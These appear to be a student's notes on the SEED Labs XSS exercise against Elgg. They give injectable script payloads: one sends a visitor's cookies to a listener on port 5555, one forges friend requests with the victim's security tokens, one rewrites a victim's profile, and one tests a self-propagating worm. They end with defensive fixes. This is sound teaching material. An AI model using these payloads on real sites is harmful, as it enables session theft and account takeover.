# Cross Site Scripting(XSS)

## Summary 
## Condition:
* The victim is logged in to the vulnerable website. 

## What happens: 
* The attacker injects a malicious JavaScript code in the vulnerable website. 
* The victim surfs through the pages of the vulnerable website. 
* Attacker's JavaScript code runs on the victim's browser. 
* Attackers performs malicious activities with the JavaScript. 

Note: CSRF attacks do not violate same origin policy. (?)

## Useful Links:
* Web and network security, CS 155, Stanford University, https://crypto.stanford.edu/cs155/
* https://excess-xss.com/
* Seedlab, Syracuse University,http://www.cis.syr.edu/~wedu/seed/ 

## Tasks:

#### A simple blogpost application in php 
* Link : https://gitlab.com/shivapbhusal/app_analysis/tree/shiva/security_examples/xss
* Shows how attackers can inject malicious JavaScript code to the system and perform evil activities. 

#### SeedLab Activities 
Link : http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Web/Web_XSS_Elgg/Web_XSS_Elgg.pdf
#### Task 1: Popup window
The user injects this code in his profile. When other user visits his profile, a popup window appears. 

```javascript
<script>
alert('XSS attack');
</script>
```

#### Task 2 : Display cookies 

```javascript
<script>
alert(document.cookie);
</script>
```

#### Task 3: Stealing cookies: 
The TCP server program in c can be used to view the cookie information from the port 5555. 

```javascript
<script>
document.write('<img src=http://127.0.0.1:5555?c='+escape(document.cookie) + '   >');
</script>
```

#### Task 4 : Sending the friend request on behalf of the user. 
If I inject this code to my profile, whoever visits my profile will send a friend request to me. 

```javascript
<script>
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=40"+ts+token; 
var Ajax=new XMLHttpRequest ();
Ajax.open("GET",sendurl,true); 
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.send(); 
</script>
```

#### Task 5: Changing the profile information of the user. 
It is not working properly. The draft code for the post request looks like this. We need to figure out how we can get name and other information 

```javascript 
<script>
var Ajax=null;
var victim_ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var victim_token="&__elgg_token="+elgg.security.token.__elgg_token;
var victim_id="&guid="+elgg.page_owner.guid;
var victim_name="&name="+elgg.page_owner;
Ajax=new XMLHttpRequest();
Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
var content=victim_ts+victim_token+victim_name+"&description=Samy_is_my_hero&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2"+victim_id; 
Ajax.send(content);
</script>
```

JSON parse for guid
```javascript 
<script>
var owner = JSON.parse(elgg.page_owner);
alert(owner.guid);
</script>
```

Working example JSON parse:
```javascript 
<script>
var jsontext = '{"firstname":"Jesper","surname":"Aaberg"}'
var info=JSON.parse(jsontext);
alert(info.firstname);
 </script>
```

Test for self propagating worm :
```javascript 
<script id="worm">
var strcode=document.getElementById("worm");
alert(strcode.innerHTML);
</script>
```

## Preventive measures:
### Summary:
* **Encoding**: Interpreting the user input as just the data and not the code. Treating malicious JavaScript as just a plain text. 

* **Validation**: Filters the user input and excludes the malicious JavaScript code. 

### In Elgg (SeedLab): 
* Login as admin. Go to administration>>plugin>>HTMLawed 1.8. Click on Activate. 
* Go to /var/www/XSS/elgg/views/default/output folder & uncomment htmlspecialchars() call in the files listed in the instruction document. 
